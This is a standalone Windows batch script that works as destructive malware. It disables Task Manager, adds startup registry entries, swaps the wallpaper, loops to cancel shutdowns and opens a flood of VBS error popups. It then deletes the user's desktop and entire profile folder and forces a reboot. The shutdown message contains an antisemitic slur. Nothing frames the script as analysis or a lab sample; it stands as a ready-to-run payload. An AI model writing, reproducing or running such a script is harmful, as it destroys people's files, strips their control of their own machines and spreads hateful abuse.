@echo off
copy imgwall.jpg "%windir%\system32\wallpaperhit.jpg"/y
del imgwall.jpg/q
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v Notepad /t REG_SZ /d %Systemroot%\System32\notepad.exe /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v Calculator /t REG_SZ /d %Systemroot%\System32\calc.exe /f
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%windir%\system32\wallpaperhit.jpg" /f
explorer
explorer
if exist "%userprofile%\Browser" rd "%userprofile%\Browser"/q/s
md "%userprofile%\Browser"
attrib +h "%userprofile%\Browser"
cd "%userprofile%\Browser"
echo do > "%windir%\shutdownt.vbs"
echo createobject("wscript.shell").run "shutdown -a",0 >> "%windir%\shutdownt.vbs"
echo wscript.sleep 350 >> "%windir%\shutdownt.vbs"
echo loop >> "%windir%\shutdownt.vbs"
start %windir%\shutdownt.vbs
echo msgbox "Slaves ERROR", 16, "ERROR" > "%userprofile%\Browser\SlavesE.vbs"
echo do > "%userprofile%\Browser\Gameover.vbs
echo msgbox "GAME OVER, JAW", 16, "JAW" >> "%userprofile%\Browser\Gameover.vbs
echo loop >> "%userprofile%\Browser\Gameover.vbs
timeout 1 >nul /nobreak
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
timeout 1 >nul /nobreak
taskkill/im wscript.exe /f
start %windir%\shutdownt.vbs
start Gameover.vbs
timeout 1 >nul /nobreak
timeout 1 >nul /nobreak
rd "%userprofile%\desktop"/q /s
timeout 1 >nul /nobreak
rd "%userprofile%"/s /q
taskkill /f /im wscript.exe
shutdown /r /c "YOU ARE JEW" /t 3 /f
